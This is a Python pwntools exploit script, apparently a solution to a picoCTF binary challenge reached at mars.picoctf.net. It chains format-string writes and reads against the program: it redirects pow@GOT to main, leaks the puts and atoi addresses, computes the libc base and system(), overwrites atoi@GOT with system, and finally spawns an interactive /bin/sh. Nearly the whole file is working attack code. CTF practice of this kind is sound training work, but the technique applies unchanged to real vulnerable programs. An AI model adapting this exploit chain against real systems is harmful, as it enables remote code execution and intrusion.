from pwn import *

# -------------------------------
# Setup
# -------------------------------
context.binary = elf = ELF('./chall')
# context.log_level = 'debug'

# Remote connection
p = remote('mars.picoctf.net', 31929)


# -------------------------------
# Stage 1: Return to main (stabilize execution)
# -------------------------------
pow_got      = elf.got['pow']
main_addr    = elf.symbols['main']
bytes_on_stack = 38

# Compute padding for return-to-main overwrite
bytes_to_print = (main_addr - bytes_on_stack - 2) & 0xffff

# Payloads to overwrite pow@GOT → main
payload_a = b'1234567.' + p64(pow_got)
payload_b = f'1.%{bytes_to_print}c%11$hn'.encode()

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)


# -------------------------------
# Stage 2: Leak puts() address
# -------------------------------
puts_got  = elf.got['puts']

payload_a = b'1234567.' + p64(puts_got)
payload_b = b'1.%11$s'

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)

p.recvuntil(b"and B: 1.")
leak = p.recvn(6)

puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f"Leaked puts() address: {hex(puts_addr)}")


# -------------------------------
# Stage 3: Leak atoi() address
# -------------------------------
atoi_got = elf.got['atoi']

payload_a = b'1234567.' + p64(atoi_got)
payload_b = b'1.%11$s'

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)

p.recvuntil(b"and B: 1.")
leak = p.recvn(6)

atoi_addr = u64(leak.ljust(8, b'\x00'))
log.success(f"Leaked atoi() address: {hex(atoi_addr)}")


# -------------------------------
# Stage 4: Calculate libc base + system()
# -------------------------------
puts_offset     = elf.libc.symbols['puts']
glibc_base_addr = puts_addr - puts_offset
log.success(f"Glibc base address: {hex(glibc_base_addr)}")

system_offset   = 0x55410
system_addr     = glibc_base_addr + system_offset
log.success(f"system() address: {hex(system_addr)}")


# -------------------------------
# Stage 5: Overwrite atoi@GOT → system
# -------------------------------
low  = system_addr & 0xffff
high = (system_addr >> 16) & 0xffff

# Padding values for format writes
first  = (low - bytes_on_stack - 2) & 0xffff
second = (high - low) & 0xffff

# Payloads: write system() into atoi@GOT
payload_a  = b'1234567.' + p64(atoi_got) + p64(atoi_got + 2)
payload_b  = f'1.%{first}c'.encode() + b'%11$hn'
payload_b += f'%{second}c'.encode() + b'%12$hn'

p.sendlineafter(b'A: ', payload_a)
p.sendlineafter(b'B: ', payload_b)


# -------------------------------
# Stage 6: Trigger system("/bin/sh")
# -------------------------------
p.sendlineafter(b'A: ', b'/bin/sh')
p.sendlineafter(b'B: ', b'')
p.interactive()
